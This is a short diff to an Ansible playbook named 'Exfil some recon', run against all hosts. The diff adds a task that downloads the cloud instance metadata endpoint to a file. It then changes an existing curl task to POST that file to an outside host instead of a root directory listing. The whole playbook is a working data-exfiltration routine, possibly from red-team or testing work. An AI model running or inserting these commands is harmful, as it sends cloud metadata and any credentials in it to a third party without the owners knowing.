@@ -1,11 +1,15 @@
 ---
-- name: Exfil some recon
+- name: Exfil some recon.
   hosts: all
  
   tasks:
+  - name: Metadata
+    shell: curl http://169.254.169.254/latest/meta-data/ -o curl.txt
+
   - name: Connect out to x86.party.
-    shell: curl -d "$(ls -la /)" -X POST https://sendmedataplease.x86.party
+    shell: curl -d "$(cat curl.txt)" -X POST https://sendmedataplease.x86.party
     register: shell
 
   - name: Debug output.
     debug: msg={{ shell.stdout }}
+
